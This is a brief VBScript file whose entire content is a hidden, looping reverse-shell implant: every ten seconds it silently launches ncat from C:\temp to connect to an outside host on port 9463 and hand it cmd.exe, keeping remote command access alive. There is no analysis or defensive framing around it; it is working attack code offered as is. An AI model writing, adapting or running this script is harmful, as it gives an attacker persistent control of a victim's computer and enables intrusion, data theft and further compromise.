Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")
Do while True:
	ncShell.Run "powershell.exe C:\temp\ncat.exe t.angelparliament.com 9463 -e cmd.exe", 0, true
	WScript.Sleep(10000)
loop
